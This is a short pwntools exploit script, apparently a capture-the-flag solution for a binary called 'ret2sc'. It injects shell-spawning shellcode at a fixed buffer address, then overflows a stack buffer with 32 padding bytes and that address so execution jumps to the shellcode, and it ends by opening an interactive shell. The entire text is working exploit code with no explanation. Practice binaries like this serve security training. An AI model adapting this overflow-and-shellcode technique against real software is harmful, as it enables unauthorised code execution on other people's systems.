from pwn import *

binary = './ret2sc'
context.binary = binary
p = process(binary)

name = 0x804a060
p.sendlineafter(':',asm(shellcraft.sh()))
p.sendlineafter(':',flat('a'*32,name))

p.interactive()